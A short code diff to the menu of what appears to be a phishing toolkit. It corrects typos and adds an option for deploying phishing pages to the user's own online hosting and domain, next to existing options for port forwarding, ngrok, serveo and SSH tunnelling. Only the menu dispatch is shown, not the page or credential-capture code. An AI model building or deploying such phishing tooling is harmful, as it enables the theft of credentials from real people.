@@ -50,12 +50,13 @@ if error_raise == 0:
         banner()
         print(f"{GREEN}0. Create Phishing Page for within the network.")
         print("1. Create Phishing Page for outside the network using ROUTER PORT FORWARDING.")
-        print("2. Create Phishing Page for outside th network using localhost.run (SSH TUNNELING).")
-        print("3. Create Phishing Page for outside th network using ngrok")
-        print("4. Create Phishing Page for outside th network using serveo.net")
-        print("5. Exit.")
+        print("2. Create Phishing Page for outside the network using localhost.run (SSH TUNNELING).")
+        print("3. Create Phishing Page for outside the network using ngrok")
+        print("4. Create Phishing Page for outside the network using serveo.net")
+        print("5. Create Phishing Page for your online Hosting and Domain")
+        print("6. Exit.")
         option = input(f"[?] Select the option by typing corresponding index number -->{RESET}")
-        if option == "5" or option == "exit" or option == "Exit" or option == "EXIT":
+        if option == "6" or option == "exit" or option == "Exit" or option == "EXIT":
             ON = False
         elif option == "0":
             os.system("clear")
@@ -72,6 +73,9 @@ if error_raise == 0:
         elif option == "4":
             os.system("clear")
             PhishSetup().setup_with_serveo()
+        elif option == "5":
+            os.system("clear")
+            PhishSetup().setup_files_for_online_hosting()
 
         
 
